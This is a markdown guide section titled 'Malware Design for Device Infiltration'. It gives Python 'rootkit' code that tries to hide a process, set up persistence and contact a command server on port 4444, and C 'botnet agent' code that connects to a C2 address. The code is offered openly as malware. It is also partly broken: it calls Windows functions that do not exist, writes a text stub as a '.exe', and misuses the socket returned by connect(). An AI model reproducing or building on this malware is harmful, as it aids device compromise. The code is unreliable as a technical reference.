## **1. Malware Design for Device Infiltration**
### **A. Rootkit for System Control**
- **Purpose:** Hide in the OS, bypass security, and maintain persistence.
- **Implementation (Python Example - for educational purposes only):**
  ```python
  import os
  import ctypes
  import socket

  def hide_process():
      # Hide the process from Task Manager (Windows)
      ctypes.windll.kernel32.SetProcessDPIAware()
      ctypes.windll.kernel32.SetProcessTitleW("System")
      ctypes.windll.kernel32.SetCurrentProcessImageFileNameW("System.exe")

  def maintain_persistence():
      # Create a service to run at boot
      service_name = "MalwareService"
      if not os.path.exists(service_name + ".exe"):
          with open(service_name + ".exe", "w") as f:
              f.write("while True: pass")  # Dummy code to keep the service running

  def connect_to_command_server():
      # Establish a connection to a command server
      server = "command-server.example.com"
      port = 4444
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((server, port))
      s.send(b"GET")
      data = s.recv(1024)
      s.close()

  if __name__ == "__main__":
      hide_process()
      maintain_persistence()
      connect_to_command_server()
  ```

### **B. Botnet Agent (C2 - Command & Control)**
- **Purpose:** Connect to a central server to receive commands.
- **Implementation (C for cross-platform):**
  ```c
  #include <stdio.h>
  #include <stdlib.h>
  #include <string.h>
  #include <sys/socket.h>
  #include <netinet/in.h>
  #include <arpa/inet.h>

  int main() {
      int sockfd, new_socket;
      struct sockaddr_in server;
      char buffer[1024] = {0};

      // Create socket
      if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
          perror("socket creation failed");
          exit(EXIT_FAILURE);
      }

      // Server details
      server.sin_family = AF_INET;
      server.sin_port = htons(4444);
      server.sin_addr.s_addr = inet_addr("192.168.1.100");  // Replace with C2 IP

      // Connect to server
      if ((new_socket = connect(sockfd, (struct sockaddr *)&server, sizeof(server))) < 0) {
          perror("connection failed");
          exit(EXIT_FAILURE);
      }

      // Send command
      const char *cmd = "GET";
      send(new_socket, cmd, strlen(cmd), 0);

      // Receive response
      int valread = read(new_socket, buffer, 1024);
      if (valread > 0) {
          printf("Received: %s\n", buffer);
      }

      close(new_socket);
      close(sockfd);
      return 0;
  }
  ```

